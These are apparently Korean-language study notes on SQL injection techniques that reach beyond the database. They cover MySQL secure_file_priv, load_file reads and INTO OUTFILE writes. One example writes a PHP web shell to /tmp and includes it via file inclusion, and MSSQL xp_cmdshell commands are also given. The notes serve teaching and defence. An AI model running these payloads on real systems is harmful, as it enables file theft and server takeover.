Out Of DBMS :
    DBMS에서 제공하는 특별한 함수 또는 기능 등을 이용해 파일 시스템, 네트워크 심지어 OS 명령어 등에도 접근할 수 있습니다.

    이를 통해 SQL Injection을 통해 단순히 데이터베이스의 정보만을 획득하는 것이 아니라 파일 시스템, 네트워크, 시스템 장악까지도 가능할 수도 있습니다.

    해당 공격 방식은 DBMS의 버전과 설정에 따라 정상적으로 동작하지 않을 수 있습니다.
    DBMS의 버전이 올라감에 따라 기본적으로 위험한 함수나 기능 등을 제거하거나,
    기본 설정/권한으로 접근하지 못하게 하는 등 다양한 방법으로 해당 공격 방식에 대해 패치를 진행하고 있습니다.

MySQL :
    File System :
        MySQL에서 파일 관련된 작업을 할 때 mysql(uid, gid) 권한을 기준으로 작동하고 설정(my.cnf)에 있는 secure_file_priv 값에 영향을 받습니다.

        If empty, the variable has no effect. This is not a secure setting.
        https://dev.mysql.com/doc/refman/8.0/en/server-system-variables.html#sysvar_secure_file_priv

        # my.cnf
        [mysqld]
        # secure_file_priv = ""   # 미설정. 기본 설정 값으로 설정됩니다.
        secure_file_priv = "/tmp" # 해당 디렉터리 하위 경로에만 접근 가능합니다.
        secure_file_priv = ""     # mysql의 권한이 가능한 모든 경로에 접근이 가능합니다.
        secure_file_priv = NULL   # 기능이 비활성화 됩니다.

        기본 설정으로 /var/lib/mysql-files/ 를 가지는 시스템이 많습니다.
        아래와 같이 쿼리를 통해서도 확인할 수 있습니다.

        mysql> select @@secure_file_priv;
        +-----------------------+
        | @@secure_file_priv    |
        +-----------------------+
        | /var/lib/mysql-files/ |
        +-----------------------+

        1) load_file
            LOAD_FILE(file_name) 형태로 사용됩니다.
            인자로 주어진 파일을 읽어 파일 내용을 문자열로 반환합니다.
            파일의 전체 경로 이름을 지정해야하며 해당 파일에 대한 권한이 있어야합니다.
            ex)
                # echo test1234 > /var/lib/mysql-files/test
                mysql> select load_file('/var/lib/mysql-files/test');
                +----------------------------------------+
                | load_file('/var/lib/mysql-files/test') |
                +----------------------------------------+
                | test1234                               |
                +----------------------------------------+

        2) into outfile
            SELECT ... INTO 형식의 쿼리는 쿼리 결과를 변수나 파일에 쓸 수 있습니다.
            ex)
                SELECT ... INTO var_list             # column 값을 변수에 저장
                SELECT ... INTO OUTFILE  'filename'  # 쿼리 결과의 rows 값을 파일에 저장
                SELECT ... INTO DUMPFILE 'filename'  # 쿼리 결과(single row)를 파일에 저장

            파일에 값을 쓸 수 있기 때문에 secure_file_priv 값이 올바르게 설정되지 않은 경우 추가적인 공격으로 연계될 수 있습니다.
            ex)
                mysql> select '<?=`ls`?>' into outfile '/tmp/a.php';
                /*
                <?php 
                include $_GET['page'].'.php'; // "?page=../../../tmp/a"
                */

MSSQL :
    OS Command :
        # SQL Server 2005 버전부터는 기본적으로 비활성화된 기능입니다.
        EXEC xp_cmdshell "net user";
        EXEC master.dbo.xp_cmdshell 'ping 127.0.0.1';






















